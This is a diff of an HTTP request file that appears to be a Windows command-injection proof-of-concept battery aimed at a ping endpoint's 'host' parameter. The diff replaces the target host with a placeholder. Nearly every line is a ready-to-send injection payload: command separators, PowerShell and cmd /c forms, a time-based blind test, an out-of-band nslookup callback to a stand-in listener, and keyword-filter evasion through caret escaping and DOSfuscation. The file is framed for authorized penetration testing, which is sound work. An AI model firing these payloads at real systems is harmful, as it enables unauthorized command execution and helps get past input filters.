@@ -8,7 +8,7 @@
 # ';' as a separator) - "no result" from cmdi_linux_poc.http does NOT mean
 # safe. Always run both batteries.
 #
-# WHAT TO EDIT:  target.com  -> your authorized target;  /api/ping?host= ->
+# WHAT TO EDIT:  target.example.invalid  -> your authorized target;  /api/ping?host= ->
 # the vulnerable parameter. BENIGN markers only (whoami/ver/echo %OS%).
 #
 # CONFIRM: whoami output / OS version string in the response, or OOB callback.
@@ -16,49 +16,49 @@
 # ============================================================================
 
 ### 1) Windows separator battery (& is the cmd.exe separator)
-GET https://target.com/api/ping?host=127.0.0.1&whoami HTTP/1.1
-Host: target.com
+GET https://target.example.invalid/api/ping?host=127.0.0.1&whoami HTTP/1.1
+Host: target.example.invalid
 
 ###
-GET https://target.com/api/ping?host=127.0.0.1|whoami HTTP/1.1
-Host: target.com
+GET https://target.example.invalid/api/ping?host=127.0.0.1|whoami HTTP/1.1
+Host: target.example.invalid
 
 ### 2) || runs on failure - strong blind test on a bad host
-GET https://target.com/api/ping?host=127.0.0.1||ver HTTP/1.1
-Host: target.com
+GET https://target.example.invalid/api/ping?host=127.0.0.1||ver HTTP/1.1
+Host: target.example.invalid
 
 ### 3) OS confirmation strings (echo %OS% = Windows_NT)
-GET https://target.com/api/ping?host=127.0.0.1&echo+%25OS%25 HTTP/1.1
-Host: target.com
+GET https://target.example.invalid/api/ping?host=127.0.0.1&echo+%25OS%25 HTTP/1.1
+Host: target.example.invalid
 
 ### 4) cmd /c explicit form
-GET https://target.com/api/ping?host=127.0.0.1&cmd+/c+whoami HTTP/1.1
-Host: target.com
+GET https://target.example.invalid/api/ping?host=127.0.0.1&cmd+/c+whoami HTTP/1.1
+Host: target.example.invalid
 
 ### 5) newline separator (works cross-platform)
-GET https://target.com/api/ping?host=127.0.0.1%0Awhoami HTTP/1.1
-Host: target.com
+GET https://target.example.invalid/api/ping?host=127.0.0.1%0Awhoami HTTP/1.1
+Host: target.example.invalid
 
 ### 6) time-based blind (ping -n = Windows sleep)
-GET https://target.com/api/ping?host=127.0.0.1&ping+-n+10+127.0.0.1 HTTP/1.1
-Host: target.com
+GET https://target.example.invalid/api/ping?host=127.0.0.1&ping+-n+10+127.0.0.1 HTTP/1.1
+Host: target.example.invalid
 
 ### 7) OOB confirm (EDIT: YOUR-OOB-HOST.example.invalid -> your listener)
-GET https://target.com/api/ping?host=127.0.0.1&nslookup+cmdi-win.YOUR-OOB-HOST.example.invalid HTTP/1.1
-Host: target.com
+GET https://target.example.invalid/api/ping?host=127.0.0.1&nslookup+cmdi-win.YOUR-OOB-HOST.example.invalid HTTP/1.1
+Host: target.example.invalid
 
 ### 8) caret escape evasion (keyword filters) - w^h^o^a^m^i == whoami
-GET https://target.com/api/ping?host=127.0.0.1&w%5Eh%5Eo%5Ea%5Em%5Ei HTTP/1.1
-Host: target.com
+GET https://target.example.invalid/api/ping?host=127.0.0.1&w%5Eh%5Eo%5Ea%5Em%5Ei HTTP/1.1
+Host: target.example.invalid
 
 ### 9) DOSfuscation - rebuild "whoami" from %COMSPEC% substring
-GET https://target.com/api/ping?host=127.0.0.1&%25COMSPEC:~-7,3%25 HTTP/1.1
-Host: target.com
+GET https://target.example.invalid/api/ping?host=127.0.0.1&%25COMSPEC:~-7,3%25 HTTP/1.1
+Host: target.example.invalid
 
 ### 10) PowerShell marker (when PS is the shell)
-GET https://target.com/api/ping?host=127.0.0.1&powershell+-c+$env:COMPUTERNAME HTTP/1.1
-Host: target.com
+GET https://target.example.invalid/api/ping?host=127.0.0.1&powershell+-c+$env:COMPUTERNAME HTTP/1.1
+Host: target.example.invalid
 
 ### 11) env-var substring + FOR /F rebuild (advanced DOSfuscation)
-GET https://target.com/api/ping?host=127.0.0.1&for+/f+%25i+in+('whoami')+do+@echo+%25i HTTP/1.1
-Host: target.com
+GET https://target.example.invalid/api/ping?host=127.0.0.1&for+/f+%25i+in+('whoami')+do+@echo+%25i HTTP/1.1
+Host: target.example.invalid
